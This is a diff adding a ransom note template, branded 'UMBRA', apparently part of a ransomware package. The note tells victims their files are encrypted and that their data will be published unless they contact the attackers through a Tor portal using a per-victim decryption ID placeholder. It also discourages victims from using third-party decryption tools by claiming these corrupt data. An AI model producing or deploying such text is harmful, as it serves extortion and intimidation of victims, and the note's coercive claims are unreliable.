@@ -1,0 +1,18 @@
+~~~ UMBRA — Your files have been encrypted ~~~
+
+>>>> All your data has been encrypted.
+
+	If you do not contact us, your data will be published.
+
+	>>>> How to contact us?
+
+	Download and install Tor Browser: https://www.torproject.org/
+	Open our contact portal in Tor Browser.
+	Provide your DECRYPTION ID and we will reply within 24 hours.
+
+	>>>> Warning!
+
+	Do NOT delete or modify any encrypted files — this will cause permanent data loss.
+	Do NOT attempt to decrypt files with third-party tools — this will corrupt your data.
+
+>>>> Your personal DECRYPTION ID: {DECRYPTION_ID}
